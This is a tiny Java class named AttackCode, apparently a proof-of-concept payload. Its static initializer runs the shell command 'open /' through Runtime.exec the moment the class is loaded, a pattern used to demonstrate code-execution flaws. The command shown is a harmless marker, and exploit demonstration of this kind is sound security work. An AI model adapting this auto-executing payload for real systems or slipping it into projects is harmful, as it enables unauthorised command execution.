package com.example;

public class AttackCode {
    
    static {
        try {
            System.out.println("start run");
            String cmds = "open /";
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
